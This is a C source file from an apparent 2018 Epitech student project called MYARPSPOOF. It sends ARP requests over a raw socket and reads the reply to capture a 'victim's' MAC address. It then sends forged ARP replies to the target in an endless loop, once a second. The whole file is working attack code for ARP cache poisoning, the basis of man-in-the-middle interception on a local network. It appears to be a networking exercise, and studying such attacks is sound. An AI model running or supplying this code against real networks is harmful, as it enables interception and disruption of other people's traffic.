/*
** EPITECH PROJECT, 2018
** MYARPSPOOF
** File description:
** snd_rcv_func.c
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "spoof.h"

static void print_victime(arp_header_t *arp_rep)
{
    printf("Found victim's MAC address: '");
    for (int i = 0; i < 6; ++i) {
        printf("%02X", arp_rep->mac_resp[i]);
        if (i < 5)
            printf(":");
    }
    printf("'\n");
}

void send_arp(int sd, arp_header_t *arp, struct sockaddr_ll *sock_addr)
{
    unsigned char buf[BUF_SIZE];
    int ret = 0;

    memset(&buf, 0x00, BUF_SIZE);
    memcpy(&buf, arp, sizeof(*arp));
    if ((ret = sendto(sd, buf, sizeof(*arp), 0
            , (struct sockaddr *)sock_addr
            , sizeof(*sock_addr))) == -1) {
        perror("Failed sendto");
        exit(FAILURE);
    }
}

static void loop_send(int sd, arp_header_t *arp, char **av, int ifindex)
{
    struct sockaddr_ll sock_addr;

    arp->opcode = ARP_REPLY;
    fill_struct_sockaddr(&sock_addr, ifindex, arp);
    while (true) {
        send_arp(sd, arp, &sock_addr);
        printf("Spoofed packet sent to '%s'\n", av[1]);
        sleep(1);
    }
}

void receiv_arp(int sd, char **av, arp_header_t *arp, int ifindex)
{
    unsigned char buf[BUF_SIZE];
    struct ethhdr *eth = (struct ethhdr *)buf;
    arp_header_t *arp_resp = (arp_header_t *)buf;

    memset(&buf, 0x00, BUF_SIZE);
    while (true) {
        if (recvfrom(sd, buf, BUF_SIZE, 0, NULL, NULL) == -1) {
            perror("Failed recvfrom");
            exit(FAILURE);
        }
        if (eth->h_proto == PROTO_ARP) {
            for (int index = 0; index < 6; ++index) {
                arp->targ_mac[index] = arp_resp->mac_resp[index];
                arp->mac_dist[index] = arp_resp->mac_resp[index];
            }
            print_victime(arp_resp);
            loop_send(sd, arp, av, ifindex);
        }
    }
}